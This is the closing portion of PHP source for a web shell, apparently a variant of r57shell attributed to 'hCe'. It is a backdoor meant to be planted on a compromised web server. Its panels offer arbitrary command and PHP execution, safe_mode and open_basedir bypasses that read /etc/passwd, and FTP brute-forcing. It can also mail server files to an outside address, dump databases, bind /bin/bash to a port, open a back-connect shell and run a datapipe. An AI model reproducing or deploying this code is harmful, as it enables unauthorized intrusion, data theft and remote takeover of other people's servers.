echo "</b>";
echo "</td></tr></table>";

echo "<table width=100% cellpadding=0 cellspacing=0>";
function up_down($id)
 {
 return '&nbsp<img src='.$_SERVER['PHP_SELF'].'?img=1 onClick="document.getElementById(\''.$id.'\').style.display = \'none\'; document.cookie=\''.$id.'=0;\';" title="Hide"><img src='.$_SERVER['PHP_SELF'].'?img=2 onClick="document.getElementById(\''.$id.'\').style.display = \'block\'; document.cookie=\''.$id.'=1;\';" title="Show">';	
 }
function div($id)
 { 
 if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id="'.$id.'" style="display: none;">'; 	
 return '<div id="'.$id.'">';
 }
if(!$safe_mode){
echo $fs.$table_up1."Execute command on server".up_down('id1').$table_up2.div('id1').$ts;
echo sr(15,"<b>Run command :".$arrow."</b>",in('text','cmd',85,''));
echo sr(15,"<b>Work directory ".$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,"Execute"));
echo $te.'</div>'.$table_end1.$fe;
}
else{
echo $fs.$table_up1."Work in safe_mode ".up_down('id2').$table_up2.div('id2').$ts;
echo sr(15,"<b>Work directory ".$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,"Change"));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1."Edit files".up_down('id3').$table_up2.div('id3').$ts;
echo sr(15,"<b> File for edit ".$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,"Edit file"));
echo $te.'</div>'.$table_end1.$fe;
if($safe_mode){
echo $fs.$table_up1."Create/Delete File/Dir ".up_down('id4').$table_up2.div('id4').$ts;
echo sr(15,"<b> name ".$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>Create</option><option value=delete>Delete</option></select>".ws(3)."<select name=what><option value=file>File</option><option value=dir>Dir</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,"Create/Delete"));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode && $unix){
echo $fs.$table_up1."Chown/Chgrp/Chmod".up_down('id5').$table_up2.div('id5').$ts;
echo sr(15,"<b>Command".$arrow."</b>","<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>".ws(2)."<b>"."param1".$arrow."</b>".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."<b>"."param2".$arrow."</b>".ws(2).in('text','param2 title="'."Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...".'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,"Execute"));
echo $te.'</div>'.$table_end1.$fe;
}
if(!$safe_mode){
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 $aliases2 .= "<option>$alias_name</option>";
 }
echo $fs.$table_up1."Aliases".up_down('id6').$table_up2.div('id6').$ts;
echo sr(15,"<b>".ws(9)."Select alias".$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,"Execute"));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1."Find text in files".up_down('id7').$table_up2.div('id7').$ts;
echo sr(15,"<b>"."Find text ".$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,"Find"));
echo sr(15,"<b> In dirs ".$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>Only in files ".$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
if(!$safe_mode && $unix){
echo $fs.$table_up1."Search text in files via find ".up_down('id8').$table_up2.div('id8').$ts;
echo sr(15,"<b>"."Text for find ".$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,"Find"));
echo sr(15,"<b> Find in folder ".$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>Find in files ".$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1)." you can use regexp ".in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1."Eval PHP code ".up_down('id9').$table_up2.$font;
echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,"Execute");
echo "</div></div></font>";
echo $table_end1.$fe;
if($safe_mode&&$curl_on)
{
echo $fs.$table_up1."Test bypass open_basedir with cURL functions ".up_down('id10').$table_up2.div('id10').$ts;
echo sr(15,"<b> Cat file ".$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,"Test"));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1."Test bypass safe_mode with include function ".up_down('id11').$table_up2.div('id11').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>"."Cat file ".$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,"Test"));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&$mysql_on)
{
echo $fs.$table_up1."Test bypass safe_mode with load file in mysql ".up_down('id12').$table_up2.div('id12').$ts;
echo sr(15,"<b>Database ".$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>"."Login ".$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>"."Password".$arrow."</b>".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."<b>"."Port".$arrow."</b>".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
echo sr(15,"<b>Cat file ".$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,"Test"));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&$mssql_on)
{
echo $fs.$table_up1."Test bypass safe_mode with commands execute via MSSQL server ".up_down('id13').$table_up2.div('id13').$ts;
echo sr(15,"<b> Database ".$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>Login ".$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>Password ".$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>Port ".$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"<b>Run command ".$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,"Test"));
echo $te.'</div>'.$table_end1.$fe;
}
if(@ini_get('file_uploads')){
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1."File Upload ".up_down('id14').$table_up2.div('id14').$ts;
echo sr(15,"<b>"."Change ".$arrow."</b>",in('file','userfile',85,''));
echo sr(15,"<b>&nbsp;New name ".$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,"Upload"));
echo $te.'</div>'.$table_end1.$fe;
}
if(!$safe_mode&&!$windows){
echo $fs.$table_up1."Upload files from remote server ".up_down('id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>"."With ".$arrow."</b>","<select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>".in('hidden','dir',0,$dir).ws(2)."<b>"."Remote file ".$arrow."</b>".in('text','rem_file',78,'http://'));
echo sr(15,"<b>"."Local file ".$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,"Upload"));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1."Download files from server ".up_down('id16').$table_up2.div('id16').$ts;
echo sr(15,"<b>"."file ".$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,"Download"));
$arh = "without archivation";
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"<b>Archivation ".$arrow."</b>",in('radio','compress',0,'none').' '.$arh);
echo $te.'</div>'.$table_end1.$fe;
echo $table_up1."Php Bypass ".up_down('bypass').$table_up2.div('bypass').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<center><font face=tahoma size=-2><b><div align=center id='n'>Read File</div></b></font>";
echo sr(25,"<b>File :".$arrow."</b>",in('text','file',45,(!empty($_POST['file']))?($_POST['file']):("/etc/passwd")).in('submit','submit',2,"Read File"));
function rsg_read()
	{	
	$test="";
	$temp=tempnam($test, "cx");
	$file=$_POST['file'];	
	$get=htmlspecialchars($file);
	echo "<center><br><b><font size=2>Trying To Get File <font color=#000099><b>$get</b></font><br>";
	if(copy("compress.zlib://".$file, $temp)){
	$fichier = fopen($temp, "r");
	$action = fread($fichier, filesize($temp));
	fclose($fichier);
	$source=htmlspecialchars($action);
echo "<div align=\"center\"><b><font size=2>Start $get</b><br><br><font color=\"black\"><textarea name=report cols=40 rows=10>$source</textarea><br><b><br>Fin <b><font size=2>$get</font></b>";
	unlink($temp);
	} else {
	die("<b><font size=2><CENTER>Sorry... File
	<B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
	access.</CENTER></FONT>");
			}
	echo "</div>";
	}
	
if(isset($_POST['file']))
{
rsg_read();
}
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>View Dir</div></b></font>";
echo sr(25,"<b>Dir :".$arrow."</b>",in('text','directory',45,(!empty($_POST['directory']))?($_POST['directory']):("/etc")).in('submit','submit',2,'View'));
function rsg_glob()
{
$chemin=$_POST['directory'];
$files = glob("$chemin*");
echo "<center><b><font size=2>Trying To List Folder <font color=#000099><b>$chemin</b></font><br>";
echo "<textarea cols=40 rows=10>";
foreach ($files as $filename) {
	   echo "$filename\n";
 }
echo "</textarea></center>";
}
if(isset($_POST['directory']))
{
rsg_glob();
}
echo $te."</td>".$fe."</tr></div></table>";

if(@function_exists("ftp_connect")){
echo $table_up1."FTP ".up_down('id17').$table_up2.div('id17').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>"."Download files from remote ftp-server "."</div></b></font>";
echo sr(25,"<b>FTP-server:port ".$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>Login ".$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>Password ".$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>File on ftp ".$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"<b>Local file ".$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>Transfer mode ".$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,"Download"));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>Send file to remote ftp server</div></b></font>";
echo sr(25,"<b>FTP-server:port ".$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>Login ".$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>Password ".$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>Local file ".$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>File on ftp ".$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"<b>Transfer mode ".$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,"Upload"));
echo $te."</td>".$fe."</tr></div></table>";
}

if($unix && @function_exists("ftp_connect")){
echo $fs.$table_up1."FTP-bruteforce ".up_down('id18').$table_up2.div('id18').$ts;
echo sr(15,"<b>FTP-server:port ".$arrow."</b>",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,"Execute"));
echo sr(15,"","<font face=tahoma size=-2>use username from /etc/passwd for ftp login and password "." ( <a href=".$_SERVER['PHP_SELF']."?users>Can\'t get users list "."</a> )</font>");
echo sr(15,"",in('checkbox','reverse id=reverse',0,'1')."Use reverse (user -> resu) login for password");
echo $te.'</div>'.$table_end1.$fe;
}
if(@function_exists("mail")){
echo $table_up1."Mail ".up_down('id19').$table_up2.div('id19').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>"."Send email"."</div></b></font>";
echo sr(25,"<b>"."To ".$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"<b>"."From ".$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>"."Subject".$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"<b>Mail ".$arrow."</b>",'<textarea name=text cols=33 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
echo sr(25,"",in('submit','submit',0,"Send"));
echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>Send file to email</div></b></font>";
echo sr(25,"<b>To ".$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"<b>From ".$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>Subject ".$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from r57shell"))));
echo sr(25,"<b>Local file ".$arrow."</b>",in('text','loc_file',45,$dir));
$arh = "without archivation";
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(25,"<b>Archivation ".$arrow."</b>",in('radio','compress',0,'none').' '.$arh);
echo sr(25,"",in('submit','submit',0,"Send"));
echo $te."</td>".$fe."</tr></div></table>";
}
if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
$select = '<select name=db>';
if($mysql_on) $select .= '<option>MySQL</option>';
if($mssql_on) $select .= '<option>MSSQL</option>';
if($pg_on) $select .= '<option>PostgreSQL</option>';
if($ora_on) $select .= '<option>Oracle</option>';
$select .= '</select>';
echo $table_up1."Databases ".up_down('id20').$table_up2.div('id20').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>Show database structure</div></b></font>";
echo sr(45,"<b>Type ".$arrow."</b>",$select);
echo sr(45,"<b>Port ".$arrow."</b>",in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(45,"<b>Login ".$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(45,"<b>Password ".$arrow."</b>",in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(45,"<b>show tables ".$arrow."</b>",in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_show').in('checkbox','st id=st',0,'1'));
echo sr(45,"<b>show columns ".$arrow."</b>",in('checkbox','sc id=sc',0,'1'));
echo sr(45,"",in('submit','submit',0,"Show"));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>Dump database table</div></b></font>";
echo sr(45,"<b>Type ".$arrow."</b>",$select);
echo sr(45,"<b>Port ".$arrow."</b>",in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(45,"<b>Login ".$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(45,"<b>Password ".$arrow."</b>",in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(45,"<b>Database ".$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(45,"<b>Table ".$arrow."</b>",in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(45,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>Save dump in file ".$arrow."</b>",in('checkbox','dif id=dif',0,'1'));
echo sr(45,"<b>file ".$arrow."</b>",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(45,"",in('submit','submit',0,"Dump"));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>Run SQL query "."</div></b></font>";
echo sr(45,"<b>Type ".$arrow."</b>",$select);
echo sr(45,"<b>Port ".$arrow."</b>",in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(45,"<b>Login ".$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(45,"<b>Password ".$arrow."</b>",in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(45,"<b>Database ".$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(45,"<b>SQL query ".$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."<div align=center id='n'><textarea cols=35 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\n"))."</textarea><br>".in('submit','submit',0,"Execute")."</div></td>".$fe."</tr></div></table>";
}
if(!$safe_mode&&!$windows){
echo $table_up1."Net".up_down('id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>Bind port to /bin/bash</div></b></font>";
echo sr(40,"<b>Port ".$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>Password for access ".$arrow."</b>",in('text','bind_pass',15,'r57'));
echo sr(40,"<b>Use ".$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,"Bind"));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>Back-connect</div></b></font>";
echo sr(40,"<b>IP ".$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>Port ".$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>Use ".$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,"Connect"));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>datapipe"."</div></b></font>";
echo sr(40,"<b>Local port ".$arrow."</b>",in('text','local_port',15,'11457'));
echo sr(40,"<b>Remote host ".$arrow."</b>",in('text','remote_host',15,'irc.dalnet.ru'));
echo sr(40,"<b>Remote port ".$arrow."</b>",in('text','remote_port',15,'6667'));
echo sr(40,"<b>Use ".$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,"Run"));
echo $te."</td>".$fe."</tr></div></table>";
}
echo "</div>";

echo '</table>'.$table_up3."</div><div align=center id='n'><font face=tahoma size=-2><b>--+[ ^($)^ - http-shell by hCe | <a href=http://hcegroup.net>www.hCegRouP.NeT</a> | <a href=mailto:vns3curity@gmail.com>hCegRouP.NeT</a> | version ".$version." ]+--</b></font></div></td></tr></table>".$f;
 ?>